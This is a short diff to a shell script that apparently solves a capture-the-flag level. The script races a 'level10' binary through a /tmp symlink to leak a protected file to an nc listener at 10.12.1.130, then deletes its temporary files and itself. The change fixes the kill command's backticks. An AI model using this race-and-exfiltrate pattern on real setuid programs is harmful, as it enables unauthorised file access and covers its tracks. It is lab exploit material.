@@ -9,7 +9,7 @@ do
         while [ ! -s /tmp/output ] ; do ./level10 /tmp/link 10.12.1.130 > /dev/null; done &
         nc -lk 6969 > /tmp/output &
         while [ ! -s /tmp/output ] ; do sleep 0.01; done
-        kill -9 ps -ef | grep 'nc -lk 6969' | head -1 | awk '{print $2}'
+        kill -9 `ps -ef | grep 'nc -lk 6969' | head -1 | awk '{print $2}'`
         filesize=$(wc -c < "/tmp/output")
 done
 cat /tmp/output | awk '{print length, $0}' | sort -nr | head -1 | awk '{ print $NF }'
@@ -18,3 +18,4 @@ rm -rf /tmp/link
 rm -rf /tmp/null
 rm -rf /tmp/output
 rm $0
+
